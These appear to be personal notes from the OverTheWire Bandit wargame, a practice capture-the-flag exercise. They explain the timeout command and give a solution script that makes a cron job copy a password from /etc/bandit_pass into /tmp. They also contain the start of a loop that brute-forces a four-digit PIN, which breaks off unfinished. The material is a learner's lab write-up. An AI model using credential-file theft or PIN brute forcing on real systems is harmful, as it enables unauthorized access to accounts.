All passwords are available somehow in /etc/bandit_pass! Remember that!

timeout is a command-line utility that runs a specified command and terminates it if it is still running after a given period of time. In other words, timeout allows you to run a command with a time limit. The timeout command is a part of the GNU core utilities package, which is installed on almost any Linux distribution.

# My solution:
--------------
#!/usr/bin/bash

echo Hi, I am running! > verify # this is to debug some permissions issues I was having
output=/tmp/tmp.Stv8XYt71b/password
cat /etc/bandit_pass/bandit24 > $output

Solution to Level 24 -> Level 25:
# Brute force script
#!/usr/bin/bash

for first in {0..9}
do
        for second in {0..9}
        do
                for third in {0..9}
                do
                        for fourth in {0..9}
                        do
                                echo $PASSWORD ${first}${second}${third}${fourth}
                        done
                done
        done
